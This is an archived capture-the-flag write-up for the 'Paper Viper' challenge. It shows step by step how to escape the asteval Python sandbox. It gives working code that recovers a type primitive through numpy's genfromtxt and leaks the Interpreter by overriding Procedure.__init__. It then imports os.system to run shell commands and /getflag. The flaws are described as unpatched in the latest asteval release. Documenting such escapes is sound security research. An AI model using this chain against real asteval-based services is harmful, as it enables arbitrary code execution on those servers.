writeup not made by jailctf, you can find the original [here](https://github.com/kalmarunionenctf/kalmarctf/blob/main/2025/misc/paper-viper/solution/README.md). this is here for archival purposes

# Paper Viper

**Author**: Ward  
**Flag**: `kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`  

## Setup
Handout: `chal.py`, `Dockerfile`, `compose.yml`, `getflag.c` and a fake `flag.txt`.

`chal.py` is the main challenge file. The goal of the challenge is to get code execution on the server and run the getflag binary.
In the Dockerfile we find that `numpy` is installed, and `asteval` with version `1.0.6` (which is the latest release).

## The challenge:
The challenge description is a reference to UofTCTF (shout out to SteakEnthusiast), in which there were three challenges on `asteval`, a "safe sandboxing" library for python.
After that CTF a few of the vulnerabilities in the library were fixed, but as anyone familiar with pyjails will know, sandboxing python is very difficult to achieve with the amount of introspection the language has, and things like unpatched memory bugs in cpython. In the case of `asteval`, `numpy` is included by default, which dramatically worsens these issues.

After that CTF I went and did some more research into `asteval` and found a few 0days, some of which I turned into this challenge.

The source code of `chal.py`:
```python
import asteval

# With this many functions from numpy removed there definitely will not be a way for users to get to `type()`, which is a security risk
asteval.astutils.NUMPY_TABLE = {k: asteval.astutils.NUMPY_TABLE[k] for k in ["genfromtxt"]}

def get_input():
    print("Give input, end with a line of $END$")
    inp = ""
    while True:
        temp = input()
        if temp == "$END$":
            break
        inp += temp +"\n"
    return inp

def nope(text):
    if not text.isascii():
        quit("Sorry, only ascii!")
    if any([text.find(x) >= 0 for x in ["yt", "ty", "rm", "uf", "**"]]):
        quit('Sorry, those bigrams just give me bad vibes!')

def main():
    inp = get_input()
    nope(inp)
    asteval.Interpreter().eval(inp, raise_errors=True)

if __name__ == "__main__":
    main()
```

As we can see, the user gives multiline input which is passed through a filter and then evaluated by the `asteval` Interpreter.
With its default settings, `asteval` includes a large set of `numpy` names in the symbol table available from within the sandbox. In this challenge the player is only given a single one of these, the function `genfromtxt()`, with a comment hinting at the function `type()`.

By default, the name `type` available within the sandbox is a "safe version" of it which returns the name of the type as a string.

The filters included are written to prevent some of the easier unintended solutions. There are a lot unpatched vulnerabilities in `asteval`, some of which are quite trivial, which these filters are intended to prevent. It was quite challenging to push players in the right direction while restricting unintendeds in a way that doesn't feel too arbitrary, which I feel I didn't really succeed at.

Specifically these filters are to block:
`byte` and `bytearray`, `dtype`, `type` (the numpy attribute), `ctypes`, `format`, `buffer` and dict unwrapping as a way to pass keyword arguments to functions in a way to bypass text filters (since the dictionary keys are string literals that can be constructed past the filter).

## The solution:
During the CTF there were two solves, by two familiar faces when it comes to pyjails, from MMM and oh_word from Infobahn.

oh_word's solve went the intended route to obtain `type` and then did memory exploitation, presumably via the bytes class object.

### Getting a type primitive:
The challenge source contains a strong hint to try to obtain a `type` primitive via the one exposed `numpy` function `genfromtxt`. Having `type` would allow us to obtain references to class objects of builtin types but also of `asteval`-internal types for which we have access to their instances.

The easiest way to find this is to do some smart searches in the `numpy` library. E.g. if we search for `type(self.` we get 4 results, of which only 2 aren't in test files. More broad searches will also find it, though we would have more work in eliminating occurrences where either the arguments aren't user-controlled, or the results won't be reachable from the calling context.

From the two results we get there is one in `MaskedArray.count`:
```python
...
if isinstance(self.data, np.matrix):
    if m is nomask:
        m = np.zeros(self.shape, dtype=np.bool)
    m = m.view(type(self.data))
...
```
This isn't directly vulnerable: even if the isinstance-check wouldn't be a problem, the result of this call doesn't end up being used in such a way that we can easily get at the result.

The other option is in `MaskedIterator.__getitem__`
```python
def __getitem__(self, indx):
    result = self.dataiter.__getitem__(indx).view(type(self.ma))
    if self.maskiter is not None:
        _mask = self.maskiter.__getitem__(indx)
        if isinstance(_mask, ndarray):
            # set shape to match that of data; this is needed for matrices
            _mask.shape = result.shape
            result._mask = _mask
        elif isinstance(_mask, np.void):
            return mvoid(result, mask=_mask, hardmask=self.ma._hardmask)
        elif _mask:  # Just a scalar, masked
            return masked
    return result
```
Note that `self.dataiter` and `self.ma` are user-controlled. Thus, if we can make it so that the `.view` method of the object returned by the `__getitem__` call on `self.dataiter` either returns its argument, or e.g. adds its argument to some global list, this allows us to access the result of `type`. This would give us a useable `type` primitive.

At this point we need to figure out how to get a `MaskedIterator` instance from `genfromtxt`.

In the `numpy` code there is only one place where a `MaskedIterator` instance is created, in `MaskedArray.flat`.

If we look at the function definition of `genfromtxt`, we see the `usemask` argument. Alternatively we can search for useages of `MaskedArray` and end up at this argument.

Putting this into practice:
```python
# Get `type` primitive
def id(x):
    return x

genfromtxt.view = id
ma = genfromtxt(["1"], usemask=True)
mf = ma.flat
mf.maskiter = None
mf.ma = "foo"
mf.dataiter = [genfromtxt]
str = mf[0]
# Now str is the type `str`

mf.ma = str
t = mf[0]
# Now t is the type `type`
```

Having a type primitive, some of the logical next steps to look are instances of `asteval` classes that are available from within the sandbox, such as `Procedure`. User-defined functions within the sandbox are turned into `Procedure` objects in `asteval`.

In `asteval`, the sandbox is interpreted by having the source code parsed into an ast using `ast.parse` and then having evaluating this ast using a node visitor pattern, with functions for nodes to implement the effects that executing that node should have, with an attempt at filters on what effects to allow.

### Overriding class level dunders to leak the interpreter object:

One of the main restrictions in `asteval` is the one preventing us from getting arbitrary attributes. In traditional pyjails it is common to traverse attributes of objects to eventually end up at powerful objects, which is why `asteval` forbids some of these.
Let's see how attributes are parsed via `ast`:
```python
>>> print(ast.dump(ast.parse("a.a"), indent=" "))
Module(
   body=[
      Expr(
         value=Attribute(
            value=Name(id='a', ctx=Load()),
            attr='a',
            ctx=Load()))],
   type_ignores=[])
>>> print(ast.dump(ast.parse("a.a = 0"), indent="   "))
Module(
   body=[
      Assign(
         targets=[
            Attribute(
               value=Name(id='a', ctx=Load()),
               attr='a',
               ctx=Store())],
         value=Constant(value=0))],
   type_ignores=[])
```
Now let's look at the source code of the attribute node handler in `asteval`:
```python
def on_attribute(self, node):    # ('value', 'attr', 'ctx')
    """Extract attribute."""

    ctx = node.ctx.__class__
    if ctx == ast.Store:
        msg = "attribute for storage: shouldn't be here!"
        self.raise_exception(node, exc=RuntimeError, msg=msg)

    sym = self.run(node.value)
    if ctx == ast.Del:
        return delattr(sym, node.attr)
    return safe_getattr(sym, node.attr, self.raise_exception, node,
                        allow_unsafe_modules=self.allow_unsafe_modules)
```

It doesn't seem like we can assign to attributes here and getting attributes goes via `safe_getattr` which has filters on the attribute names.
However, remember that `asteval` evaluates code by recursing through the abstract syntax tree in a node visitor-like pattern.
For an attribute assignment, we end up in `on_assign` before ever ending up in `on_attribute`:
```python
def on_assign(self, node):    # ('targets', 'value')
    """Simple assignment."""
    val = self.run(node.value)
    for tnode in node.targets:
        self.node_assign(tnode, val)
```
```python
def node_assign(self, node, val):
    ...
    elif node.__class__ == ast.Attribute:
        if node.ctx.__class__ == ast.Load:
            msg = f"cannot assign to attribute {node.attr}"
            self.raise_exception(node, exc=AttributeError, msg=msg)

        setattr(self.run(node.value), node.attr, val)
```
i.e. in an assignment to an attribute, we will never end up in `on_attribute` and `setattr` is run unconditionally! This means that there are no actual restrictions on attribute assignment.

Let's look at the source code for `Procedure`:
```python
class Procedure:
    def __init__(self, name, interp, doc=None, lineno=None,
                 body=None, text=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
        self.__ininit__ = True
        self.name = name
        self.__name__ = self.name
        self.__asteval__ = interp
        self.__raise_exc__ = self.__asteval__.raise_exception
        self.__doc__ = doc
        self.__body__ = body
        self.__argnames__ = args
        self.__kwargs__ = kwargs
        self.__vararg__ = vararg
        self.__varkws__ = varkws
        self.lineno = lineno
        self.__text__ = text
        if text is None:
            self.__text__ = f'{self.__signature__()}\n' + ast.unparse(self.__body__)
        self.__ininit__ = False

    def __setattr__(self, attr, val):
        if not getattr(self, '__ininit__', True):
            self.__raise_exc__(None, exc=TypeError,
                               msg="procedure is read-only")
        self.__dict__[attr] = val
```
As you can see, there is a mechanism here via the `__ininit__` variable which prevents us from assigning to attributes of `Procedure` instances after they have gone through `__init__`. (as an interesting aside not further relevant for this challenge, notice the default value in `getattr(self, '__ininit__', True)`)

This mechanism prevents us from setting attributes on instances of `Procedure`, but you may know that class attributes for classes that are defined using python source code are also writeable.
The `__setattr__` defined for `Procedure` is an instance-level function, not a class-level function, which means that there are **no restrictions** on setting attributes on the class object of `Procedure` as opposed to its instances.

```python
# Get Procedure class object
def f():
    pass
p = t(f)
```

In the `__init__` of `Procedure`, the argument `interp` is a reference to the `asteval` `Interpreter` object. It's used for evaluating function calls, such that the `Interpreter` evaluation control flow can go via `__call__`. I expect that this was done such that user defined functions within the sandbox can be called in the same way as regular python functions that are exposed as names within the sandbox.

This design choice allows us to leak the `Interpreter` object.

We can override the class level `__init__` of `Procedure` in a way where we exfiltrate the `interp` argument:
```python
# Obtain the Interpreter instance
def stealer(name, interp, doc=None, lineno=None,
                 body=None, text=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
    print(interp)
    kwargs[0][1].append(interp)
p.__init__ = stealer
rescuelist = []
def g(rescue=rescuelist):
    pass
i = rescuelist[0]
print(i)
```

We now have a reference to the `Interpreter`.

### Profit:
At this point there are a variety of options. It's a very strong object that hasn't been written with security in mind.
The easiest option is to use the import functionality.
A fun alternative option is to evade the filters on attribute names in `safe_getattr` by creating a fake subtype of string and overwriting the `id` attribute of an `ast.Name` node with it, but I'll leave that as a fun exercise for the reader.

```python
# Import and escape the jail
i.import_module("os",["sys"],["system"])
sys("echo hi mom")
sys("/getflag")
print()
```

`kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`
